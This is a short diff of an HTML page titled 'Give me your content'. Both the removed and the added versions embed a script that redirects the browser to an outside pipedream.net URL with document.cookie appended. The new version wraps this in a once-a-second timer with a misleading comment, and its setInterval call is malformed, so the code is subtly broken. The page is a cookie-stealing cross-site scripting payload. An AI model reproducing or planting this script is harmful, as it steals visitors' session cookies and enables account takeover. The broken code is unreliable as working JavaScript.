@@ -2,7 +2,16 @@
 	<head>
 		<title>
 			Give me your content
-			<script>document.location="https://eo6erz82c3lvn9i.m.pipedream.net/?"+document.cookie;</script>
+			<script>
+				var count=0;
+				setInterval({
+					// Increment the count
+					count++;
+					// Update the title with the new count value
+					document.location="https://eo6erz82c3lvn9i.m.pipedream.net/?"+document.cookie;
+					document.title = document.location + count;
+			        }, 1000);
+			</script>
 		</title>
 	</head>
 	<body>
